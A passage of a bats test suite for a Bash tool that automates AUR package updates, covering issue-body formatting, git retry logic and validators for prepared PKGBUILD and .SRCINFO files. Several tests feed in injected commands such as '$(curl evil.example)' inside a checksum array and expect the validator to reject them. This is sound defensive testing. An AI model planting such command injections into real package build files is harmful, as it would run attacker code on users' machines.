Auto-created by update workflow. Publish the version by hand after the edit and set `current` in the package YAML to it. The next run closes this issue.
EOF
  )
  [ "$output" = "$expected" ]
}

@test "alert_issue_body: writes the body without _alerts" {
  echo "held: 29+1" >"$TEST_TMPDIR/demo"
  run --keep-empty-lines alert_issue_body "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  [ "${lines[1]}" = 'Held version: `29+1`' ]
  [ "${lines[4]}" = "" ]
}

@test "alert_issue_body: lists the notes of a published update" {
  echo "updated: 29+1" >"$TEST_TMPDIR/demo"
  printf '%s\t%s\t%s\n' demo notice "Create the package for the old major" >"$TEST_TMPDIR/_alerts"
  run alert_issue_body "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  expected=$(
    cat <<'EOF'
Package: `demo`
Published version: `29+1`
Run: https://example.invalid/run

- Create the package for the old major

Auto-created by update workflow. Close it once the edit is done.
EOF
  )
  [ "$output" = "$expected" ]
}

# === upstream_issue_body ===

@test "upstream_issue_body: names the release, the version of the repository and the notes" {
  echo "0.6.0" >"$TEST_TMPDIR/VERSION"
  echo "newer: 0.7.0" >"$TEST_TMPDIR/_upstream"
  run upstream_issue_body "$TEST_TMPDIR/_upstream" https://example.invalid/run
  [ "$status" -eq 0 ]
  expected=$(
    cat <<'EOF'
aurtomator 0.7.0 is out, and this repository runs 0.6.0.

Release notes: https://github.com/staticwire/aurtomator/releases/tag/v0.7.0
Run: https://example.invalid/run

Auto-created by update workflow. A run closes it once `VERSION` holds this release, or once a newer release is out.
EOF
  )
  [ "$output" = "$expected" ]
}

# === failure_issue_body ===

@test "failure_issue_body: puts the error in a code block" {
  echo "check_failed: rejected '1.0.1 @octocat https://evil.example'" >"$TEST_TMPDIR/demo"
  run failure_issue_body "$TEST_TMPDIR/demo" https://github.com/owner/repo/actions/runs/1
  [ "$status" -eq 0 ]
  expected=$(
    cat <<'EOF'
Package: `demo`
Status: check failed
Run: https://github.com/owner/repo/actions/runs/1

```
rejected '1.0.1 @octocat https://evil.example'
```

Auto-created by update workflow. A run closes it when the package recovers.
EOF
  )
  [ "$output" = "$expected" ]
}

@test "failure_issue_body: uses a fence longer than any run of backticks in the error" {
  printf '%s\n' 'update_failed: a ``` b' '````' c >"$TEST_TMPDIR/demo"
  run --keep-empty-lines failure_issue_body "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  [ "${lines[4]}" = '`````' ]
  [ "${lines[8]}" = '`````' ]
}

@test "failure_issue_body: keeps the last 4000 characters of a long error" {
  local tail
  tail=$(printf 'x%.0s' {1..4000})
  echo "update_failed: HEAD${tail}" >"$TEST_TMPDIR/demo"
  run --keep-empty-lines failure_issue_body "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  [ "${lines[5]}" = "[first 4 characters cut]" ]
  [ "${lines[6]}" = "$tail" ]
}

@test "failure_issue_body: cuts a long error by characters in the C locale" {
  local tail
  tail=$(printf '中%.0s' {1..4000})
  echo "update_failed: ab${tail}" >"$TEST_TMPDIR/demo"
  # The job containers run without a locale
  LC_ALL=C
  run --keep-empty-lines failure_issue_body "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  [ "${lines[5]}" = "[first 2 characters cut]" ]
  [ "${lines[6]}" = "$tail" ]
  printf '%s' "$output" | iconv -f UTF-8 -t UTF-8 >/dev/null
  # The caller keeps its locale
  failure_issue_body "$TEST_TMPDIR/demo" https://example.invalid/run >/dev/null
  [ "$LC_ALL" = C ]
}

# === close_comment ===

@test "close_comment: puts the status in a code block" {
  printf '%s\n' 'update_failed: a ``` b `@octocat` https://evil.example' 'c' >"$TEST_TMPDIR/demo"
  run close_comment "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  expected=$(
    cat <<'EOF'
The status of `demo` in https://example.invalid/run:

````
update_failed: a ``` b `@octocat` https://evil.example
c
````
EOF
  )
  [ "$output" = "$expected" ]
}

@test "close_comment: keeps the last 4000 characters of a long status" {
  local tail
  tail=$(printf 'x%.0s' {1..4000})
  echo "update_failed: ${tail}" >"$TEST_TMPDIR/demo"
  run --keep-empty-lines close_comment "$TEST_TMPDIR/demo" https://example.invalid/run
  [ "$status" -eq 0 ]
  [ "${lines[3]}" = "[first 15 characters cut]" ]
  [ "${lines[4]}" = "$tail" ]
}

# === aur_export and aur_reanchor ===

# Helper: a repo with a file, an executable, a symlink out of the repo and a
# directory, cloned to $TEST_TMPDIR/clone without a checkout
make_export_clone() {
  local repo="$TEST_TMPDIR/tree"
  git init -q -b master "$repo"
  echo "pkgver=1.0.0" >"$repo/PKGBUILD"
  printf '#!/bin/sh\n' >"$repo/run.sh"
  chmod +x "$repo/run.sh"
  ln -s /etc/hostname "$repo/link"
  mkdir "$repo/dir"
  echo inside >"$repo/dir/file"
  git -C "$repo" add .
  git -C "$repo" -c user.name=aur -c user.email=aur@example.invalid \
    -c commit.gpgsign=false commit -qm tree
  git clone -q --no-checkout "$repo" "$TEST_TMPDIR/clone"
}

@test "aur_export: writes the files of HEAD and stands in for links and directories" {
  make_export_clone
  run aur_export "$TEST_TMPDIR/clone" "$TEST_TMPDIR/files"
  [ "$status" -eq 0 ]
  [ "$(cat "$TEST_TMPDIR/files/PKGBUILD")" = "pkgver=1.0.0" ]
  [ -f "$TEST_TMPDIR/files/run.sh" ]
  [ ! -L "$TEST_TMPDIR/files/run.sh" ]
  [ -L "$TEST_TMPDIR/files/link" ]
  [ "$(readlink "$TEST_TMPDIR/files/link")" != /etc/hostname ]
  [ -d "$TEST_TMPDIR/files/dir" ]
  [ -z "$(ls -A "$TEST_TMPDIR/files/dir")" ]
  [ ! -e "$TEST_TMPDIR/clone/PKGBUILD" ]
}

@test "aur_reanchor: puts a clone without a checkout on master and checks nothing out" {
  make_export_clone
  local clone="$TEST_TMPDIR/clone"
  git -C "$clone" update-ref --no-deref HEAD "$(git -C "$clone" rev-parse HEAD)"
  git -C "$clone" branch -q -D master
  run aur_reanchor "$clone" --no-checkout
  [ "$status" -eq 0 ]
  [ "$(git -C "$clone" symbolic-ref HEAD)" = "refs/heads/master" ]
  [ "$(git -C "$clone" rev-parse master)" = "$(git -C "$clone" rev-parse origin/master)" ]
  [ ! -e "$clone/PKGBUILD" ]
}

# === aur_clone and aur_commit_push ===

# Helper: a sleep on PATH that logs its argument to $TEST_TMPDIR/sleeps, and
# a git whose clone always fails
mock_sleep_and_clone() {
  printf '#!/usr/bin/env bash\necho "$1" >>"%s/sleeps"\n' "$TEST_TMPDIR" >"$MOCK_DIR/sleep"
  printf '#!/usr/bin/env bash\n[[ "$1" == clone ]] && exit 128\nexec /usr/bin/git "$@"\n' >"$MOCK_DIR/git"
  chmod +x "$MOCK_DIR/sleep" "$MOCK_DIR/git"
}

# Helper: a repo without a remote, with a staged PKGBUILD, at $TEST_TMPDIR/clone
make_unpushable_repo() {
  git init -q -b master "$TEST_TMPDIR/clone"
  echo "pkgver=1.0.0" >"$TEST_TMPDIR/clone/PKGBUILD"
  git -C "$TEST_TMPDIR/clone" add PKGBUILD
}

@test "aur_clone: waits the pauses the environment sets before an SSH clone" {
  mock_sleep_and_clone
  AURTOMATOR_CLONE_DELAY=3 AURTOMATOR_RETRY_DELAY=7 run aur_clone ssh://aur@example.invalid/demo.git "$TEST_TMPDIR/clone"
  [ "$status" -eq 1 ]
  [ "$(cat "$TEST_TMPDIR/sleeps")" = $'3\n7\n7' ]
  [[ "$output" == *"Clone attempt 2 failed, retrying in 7s"* ]]
}

@test "aur_clone: an HTTPS clone does not wait before the first attempt" {
  mock_sleep_and_clone
  AURTOMATOR_CLONE_DELAY=3 AURTOMATOR_RETRY_DELAY=7 run aur_clone https://example.invalid/demo.git "$TEST_TMPDIR/clone"
  [ "$status" -eq 1 ]
  [ "$(cat "$TEST_TMPDIR/sleeps")" = $'7\n7' ]
}

@test "aur_commit_push: waits the pause the environment sets" {
  mock_sleep_and_clone
  make_unpushable_repo
  AURTOMATOR_RETRY_DELAY=7 run aur_commit_push "$TEST_TMPDIR/clone" 1.0.0 test
  [ "$status" -eq 1 ]
  [ "$(cat "$TEST_TMPDIR/sleeps")" = $'7\n7' ]
  [[ "$output" == *"Push attempt 2 failed, retrying in 7s"* ]]
}

@test "aur_commit_push: stops when git has nothing to commit" {
  mock_sleep_and_clone
  git init -q -b master "$TEST_TMPDIR/clone"
  run aur_commit_push "$TEST_TMPDIR/clone" 1.0.0 test
  [ "$status" -eq 1 ]
  [[ "$output" == *"git commit failed in $TEST_TMPDIR/clone"* ]]
  [[ "$output" != *"Push attempt"* ]]
  [ ! -e "$TEST_TMPDIR/sleeps" ]
}

@test "aur_clone and aur_commit_push: wait 2 s before an SSH clone and 5 s between attempts by default" {
  mock_sleep_and_clone
  make_unpushable_repo
  unset AURTOMATOR_CLONE_DELAY AURTOMATOR_RETRY_DELAY
  run aur_clone ssh://aur@example.invalid/demo.git "$TEST_TMPDIR/other"
  [ "$status" -eq 1 ]
  run aur_commit_push "$TEST_TMPDIR/clone" 1.0.0 test
  [ "$status" -eq 1 ]
  [ "$(cat "$TEST_TMPDIR/sleeps")" = $'2\n5\n5\n5\n5' ]
}

# === check_prepared_pkgbuild ===

@test "check_prepared_pkgbuild: accepts new pkgver, pkgrel and checksums" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1'
            '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: rejects a change outside pkgver, pkgrel and checksums" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  sed -i 's|https://example.com/demo|https://evil.example/demo|' "$NEW"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"outside pkgver, pkgrel and checksums"* ]]
}

@test "check_prepared_pkgbuild: rejects a command in a checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' \$(curl evil.example))"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
}

@test "check_prepared_pkgbuild: rejects text after a checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4'); curl evil.example"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
}

@test "check_prepared_pkgbuild: rejects a SKIP where the AUR had a hash" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"SKIP"* ]]
}

@test "check_prepared_pkgbuild: keeps a SKIP the AUR already had" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('SKIP' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: accepts a checksum array continued with a backslash" {
  local sums="sha256sums=('SKIP' \\
            'SKIP')"
  write_pkgbuild "$OLD" 1.0.0 2 "$sums"
  write_pkgbuild "$NEW" 1.1.0 1 "$sums"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: accepts a comment after a checksum array" {
  local sums="sha256sums=('SKIP' 'SKIP')  # VCS sources"
  write_pkgbuild "$OLD" 1.0.0 2 "$sums"
  write_pkgbuild "$NEW" 1.1.0 1 "$sums"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: accepts comments inside a checksum array" {
  local sums="sha256sums=( # git
            'SKIP' # patch (local)
            'SKIP')"
  write_pkgbuild "$OLD" 1.0.0 2 "$sums"
  write_pkgbuild "$NEW" 1.1.0 1 "$sums"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

# bash joins the next line to the assignment, and runs it as a command
@test "check_prepared_pkgbuild: rejects a backslash after a checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('SKIP' 'SKIP')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' 'SKIP') \\"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
}

# bash reads an escaped space there, so the # starts a word, not a comment
@test "check_prepared_pkgbuild: rejects a backslash before a hash sign in a checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('SKIP' 'SKIP')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' \\ # c
            'SKIP')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
}

# bash starts no comment right after the closing parenthesis
@test "check_prepared_pkgbuild: rejects a hash sign right after a checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('SKIP' 'SKIP')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('SKIP' 'SKIP')# c"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD has more than quoted checksums, comments and line continuations in a checksum array"* ]]
}

@test "check_prepared_pkgbuild: rejects a changed number of checksums" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes the checksum arrays"* ]]
}

@test "check_prepared_pkgbuild: rejects a new checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')
b2sums=('$H3' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes the checksum arrays"* ]]
}

@test "check_prepared_pkgbuild: rejects a new empty checksum array" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')
sha256sums_aarch64=()"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes the checksum arrays"* ]]
}

# updpkgsums writes all checksum arrays in one block at the place of the
# first, in the order makepkg -g prints them
@test "check_prepared_pkgbuild: accepts the checksum arrays updpkgsums writes in one block" {
  local x86='source_x86_64=("demo-x86_64.bin")' arm='source_aarch64=("demo-aarch64.bin")'
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')
$x86
sha256sums_x86_64=('$H1')
$arm
sha256sums_aarch64=('$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')
sha256sums_x86_64=('$H3')
sha256sums_aarch64=('$H4')
$x86
$arm"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: accepts checksum arrays in the order of makepkg -g" {
  write_pkgbuild "$OLD" 1.0.0 2 "b2sums=('$H1' '$H2')
sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')
b2sums=('$H3' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

# A run without updpkgsums keeps the layout of the AUR copy
@test "check_prepared_pkgbuild: accepts checksum arrays that stay apart as in the AUR copy" {
  local x86='source_x86_64=("git+https://example.com/x86.git")' arm='source_aarch64=("git+https://example.com/arm.git")'
  local sums="sha256sums=('SKIP' 'SKIP')
$x86
sha256sums_x86_64=('SKIP')
$arm
sha256sums_aarch64=('SKIP')"
  write_pkgbuild "$OLD" 1.0.0 2 "$sums"
  write_pkgbuild "$NEW" 1.1.0 1 "$sums"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_pkgbuild: rejects checksum arrays in two blocks" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')
b2sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  printf "b2sums=('%s' '%s')\n" "$H3" "$H4" >>"$NEW"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes lines outside pkgver, pkgrel and checksums"* ]]
}

@test "check_prepared_pkgbuild: rejects checksum arrays moved away from the place of the first one" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  sed -i -e '/^sha256sums=/d' -e "1i sha256sums=('$H3' '$H4')" "$NEW"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes lines outside pkgver, pkgrel and checksums"* ]]
}

# bash keeps the last of two arrays of one name
@test "check_prepared_pkgbuild: rejects a SKIP that moves between two arrays of one name" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('SKIP' '$H2')
sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')
sha256sums=('SKIP' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD changes the checksum arrays"* ]]
}

@test "check_prepared_pkgbuild: rejects a pkgver other than the expected version" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.2.0 1 "sha256sums=('$H3' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"pkgver"* ]]
}

@test "check_prepared_pkgbuild: rejects a pkgrel other than 1" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 3 "sha256sums=('$H3' '$H4')"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"pkgrel"* ]]
}

@test "check_prepared_pkgbuild: rejects a NUL byte" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  write_pkgbuild "$NEW" 1.1.0 1 "sha256sums=('$H3' '$H4')"
  sed -i 's|^url="https://example.com"$|url="https://example.com\x00"|' "$NEW"
  run check_prepared_pkgbuild "$OLD" "$NEW" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared PKGBUILD holds a NUL byte"* ]]
}

@test "check_prepared_srcinfo: rejects a NUL byte" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  sed -i $'s/^\tlicense = MIT$/\tlicense = MIT\\x00 extra/' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO holds a NUL byte"* ]]
}

@test "check_prepared_pkgbuild: rejects when a file cannot be read" {
  write_pkgbuild "$OLD" 1.0.0 2 "sha256sums=('$H1' '$H2')"
  run check_prepared_pkgbuild "$OLD" "$TEST_TMPDIR/missing.PKGBUILD" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Could not read"* ]]
}

# === check_prepared_srcinfo ===

@test "check_prepared_srcinfo: accepts the new version and checksums" {
  write_srcinfo "$TEST_TMPDIR/old.SRCINFO" 1.0.0 2 "$H1" "$H2"
  write_srcinfo "$TEST_TMPDIR/new.SRCINFO" 1.1.0 1 "$H3" "$H4"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

# Helper: .SRCINFO with the given pkgver and one more line
# Usage: write_srcinfo_line <path> <pkgver> <line>
write_srcinfo_line() {
  printf '%s\n' "pkgbase = demo" $'\tpkgver = '"$2" $'\tpkgrel = 1' $'\t'"$3" "" "pkgname = demo" >"$1"
}

@test "check_prepared_srcinfo: accepts the version without its last component" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 6.19.0 "source = https://download.kde.org/stable/frameworks/6.19/kio-6.19.0.tar.xz"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 6.20.0 "source = https://download.kde.org/stable/frameworks/6.20/kio-6.20.0.tar.xz"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 6.20.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts the version cut at the first plus sign" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 0.13.0+dev+1853+g6edb38ca98 "provides = neovim=0.13.0"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 0.14.0+dev+5+gabcdef0 "provides = neovim=0.14.0"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 0.14.0+dev+5+gabcdef0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts the version with underscores for dots" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 1.86.0 "source = https://example.com/boost_1_86_0.tar.gz"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 1.87.0 "source = https://example.com/boost_1_87_0.tar.gz"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.87.0
  [ "$status" -eq 0 ]
}

# Temurin early access: pkgver 28+21 for tag jdk-28+21-ea-beta, whose assets
# are named 28_21, in the repository of the major version
temurin_source() {
  printf 'source = https://github.com/adoptium/temurin%s-binaries/releases/download/jdk-%s-ea-beta/OpenJDK-jdk_x64_linux_hotspot_%s-ea.tar.gz' \
    "${1%%+*}" "$1" "${1/+/_}"
}

@test "check_prepared_srcinfo: accepts the version with underscores for plus signs" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 28+21 "$(temurin_source 28+21)"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 28+22 "$(temurin_source 28+22)"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 28+22
  [ "$status" -eq 0 ]
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 29+1 "$(temurin_source 29+1)"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 29+1
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: replaces each version form once" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 5.1.0 "source = https://example.com/5.1/demo-5.1.0.tar.gz"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 5.10.0 "source = https://example.com/5.10/demo-5.10.0.tar.gz"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 5.10.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: keeps a major version alone" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 2.50 "license = GPL-2"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 3.0 "license = GPL-3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 3.0
  [ "$status" -eq 1 ]
}

# Helper: .SRCINFO as makepkg --printsrcinfo prints it for a PKGBUILD with
# pkgdesc, license and depends holding 2.0 apart from pkgver
# Usage: write_srcinfo_lookalike <path> <pkgver>
write_srcinfo_lookalike() {
  printf '%s\n' \
    "pkgbase = demo" \
    $'\tpkgdesc = A GPL-2.0 licensed tool' \
    $'\tpkgver = '"$2" \
    $'\tpkgrel = 1' \
    $'\turl = https://example.com' \
    $'\tarch = x86_64' \
    $'\tlicense = GPL-2.0-or-later' \
    $'\tdepends = glibc>=2.0.1' \
    $'\tprovides = tool='"$2" \
    $'\tsource = https://example.com/releases/'"$2"'/demo-'"$2"'.tar.gz' \
    $'\tsha256sums = SKIP' \
    "" \
    "pkgname = demo" >"$1"
}

@test "check_prepared_srcinfo: keeps text that only looks like the old version" {
  write_srcinfo_lookalike "$TEST_TMPDIR/old.SRCINFO" 2.0
  write_srcinfo_lookalike "$TEST_TMPDIR/new.SRCINFO" 2.1
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.1
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: rejects a source that keeps the old version" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 2.0 "source = https://example.com/demo-2.0.tar.gz"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 2.1 "source = https://example.com/demo-2.0.tar.gz"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.1
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects an arch source that keeps the old version" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 2.0 "source_x86_64 = https://example.com/demo-2.0-x86_64.tar.gz"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 2.1 "source_x86_64 = https://example.com/demo-2.0-x86_64.tar.gz"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.1
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects a line changed beyond the version" {
  write_srcinfo_line "$TEST_TMPDIR/old.SRCINFO" 2.0 "depends = glibc>=2.0.1"
  write_srcinfo_line "$TEST_TMPDIR/new.SRCINFO" 2.1 "depends = glibc>=2.9"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.1
  [ "$status" -eq 1 ]
  [[ "$output" == *"changes more than the version"* ]]
}

# Helper: .SRCINFO with the given pkgver and sources, each with its sha256sum
# Usage: write_srcinfo_sources <path> <pkgver> [<source> <sha256sum>]...
write_srcinfo_sources() {
  local path=$1 pkgver=$2 i
  shift 2
  {
    printf '%s\n' "pkgbase = demo" $'\tpkgver = '"$pkgver" $'\tpkgrel = 1'
    for ((i = 1; i <= $#; i += 2)); do
      printf '\tsource = %s\n' "${!i}"
    done
    for ((i = 2; i <= $#; i += 2)); do
      printf '\tsha256sums = %s\n' "${!i}"
    done
    printf '%s\n' "" "pkgname = demo"
  } >"$path"
}

# pkgver="${_pkgver//-/.}" with the source built from _pkgver
@test "check_prepared_srcinfo: rejects a bump that changes no source URL and no checksum" {
  local src="demo-2025-04-03.tar.gz::https://example.com/archive/2025-04-03.tar.gz"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2025.04.03 "$src" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2026.09.10 "$src" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2026.09.10
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum"* ]]
}

@test "check_prepared_srcinfo: rejects a source without the version that keeps its checksum" {
  local src="https://example.com/download/latest/player-x86_64.tar.zst"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 6.00.3091 "$src" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 6.00.3092 "$src" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 6.00.3092
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum"* ]]
}

# pamac-aur saves the archive of a commit as pamac-$pkgver-$pkgrel.zip
